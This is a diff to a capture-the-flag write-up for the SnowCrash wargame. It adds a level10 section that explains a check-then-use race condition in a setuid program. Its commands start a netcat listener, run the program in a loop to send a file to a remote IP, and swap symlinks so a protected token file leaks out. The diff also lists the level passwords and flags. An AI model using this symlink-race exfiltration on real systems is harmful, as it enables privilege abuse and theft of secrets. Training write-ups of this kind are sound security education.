@@ -278,6 +278,45 @@ Password for flag09: `f3iji1ju5yuevaus41q1afiuq`
 
 Flag: `s5cAJpM8ev6XHw998pRWG728z`
 
-# Bonus??
+# Bonus
 
-Soon..
+## Level10:
+
+```bash
+level10@SnowCrash:~$ ls -l
+total 16
+-rwsr-sr-x+ 1 flag10 level10 10817 Mar  5  2016 level10
+-rw-------  1 flag10 flag10     26 Mar  5  2016 token
+level10@SnowCrash:~$ 
+```
+
+Level10 dissambled:
+![image](https://user-images.githubusercontent.com/48088579/149225798-4e40db94-72e9-43b1-8b60-031b749727c4.png)
+
+It appears that the program does not have any problem at the first look. However, there is a race condition vulnerability in this program: due to the window (the simulated delay) between the check (`access`)
+and the use (`open`), there is a possibility that the file used by access is different from the file used by `open`, even though they have the same file name /tmp/XYZ.
+
+Source: https://www.utc.edu/sites/default/files/2021-04/race-condition.pdf
+
+Exploit:
+
+### In your machine:
+```
+nc -nlvp 6969
+```
+
+### In target machine:
+First:
+```bash
+while true; do ./level10 /tmp/token 192.168.65.128 &>/dev/null; done &
+```
+Then:
+```bash
+while true; do echo "ll" > /tmp/l && ln -fs /tmp/l /tmp/token && ln -fs /home/user/level10/token /tmp/token;done
+```
+
+If you get 'll', open the nc connection until you get the password.
+
+Password for flag10: `woupa2yuojeeaaed06riuj63c`
+
+Flag: `feulo4b72j7edeahuete3no7c`
